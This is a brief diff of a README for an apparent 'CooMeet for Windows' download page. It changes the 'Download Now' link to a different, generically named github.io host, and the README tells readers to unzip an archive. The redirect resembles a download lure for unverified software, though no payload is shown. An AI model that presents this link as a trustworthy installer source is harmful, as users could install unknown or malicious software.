@@ -6,7 +6,7 @@ CooMeet for Windows delivers private and secure video chat with verified users a
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://coomeet-desktop-windows-app.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download-rep-git.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
